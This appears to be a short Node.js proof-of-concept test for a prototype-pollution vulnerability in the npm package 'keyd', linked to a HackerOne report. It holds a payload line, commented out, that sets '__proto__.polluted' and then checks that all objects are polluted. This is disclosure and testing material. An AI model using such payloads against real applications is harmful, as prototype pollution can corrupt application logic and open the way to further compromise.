//https://hackerone.com/reports/877515
const assert = require('assert');
const keyd = require('keyd');

const obj = {};

console.log("Before : " + obj.polluted);
// payload that exercises the vuln.
//keyd({}).set('__proto__.polluted', 'yes');//payload

console.log("After : " + obj.polluted);
assert(obj.polluted === "yes");
console.log("Payload succeeded");